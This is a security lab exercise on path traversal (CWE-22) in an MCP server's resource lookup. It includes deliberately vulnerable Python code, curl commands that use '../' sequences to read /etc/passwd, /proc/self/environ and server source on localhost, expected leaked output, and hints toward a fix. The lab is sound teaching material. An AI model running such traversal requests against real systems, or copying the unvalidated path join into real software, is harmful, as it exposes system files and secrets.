# Lab 03: Path Traversal via Resource URI

## Objective

Exploit path traversal vulnerability in the MCP server's resource handling. Access files outside the intended resource directory by using `../` sequences in resource URIs.

## Vulnerability Type

- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory
- **Severity**: High

## Background

The server's `resources.py` module resolves resource URIs by concatenating user input directly to a base directory path without normalization or validation. This allows attackers to navigate to parent directories and access any file on the system.

### Vulnerable Code

**File**: `server/src/resources.py:resolve_resource_uri()`

```python
def resolve_resource_uri(uri: str) -> str:
    base_dir = "/app/resources"
    # VULN: Direct string concatenation with no validation
    resource_path = os.path.join(base_dir, uri)
    # MISSING: pathlib.Path.resolve() + base directory assertion
    return resource_path
```

## Lab Exercise

### Scenario

The MCP server stores user resources in `/app/resources/`. You want to read sensitive files like `/etc/passwd` or the server's configuration files.

### Attack Examples

```bash
# Access /etc/passwd
curl http://localhost:8000/resources/get/../../../../etc/passwd

# Access environment variables
curl http://localhost:8000/resources/get/../../../../proc/self/environ

# Access server source code
curl http://localhost:8000/resources/get/../../../../app/src/auth.py
```

### Expected Behavior

**Without fix** (vulnerable):
```json
{
  "resource_id": "../../../../etc/passwd",
  "content": "root:x:0:0:root:/root:/bin/bash\n..."
}
```

**With fix** (secure):
```json
{
  "error": "Invalid resource path",
  "message": "Resource path must be within /app/resources"
}
```

## Hints

- Look at how the resource path is constructed
- Think about what `../` does in file paths
- Consider using `pathlib.Path.resolve()` to normalize paths

## References

- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
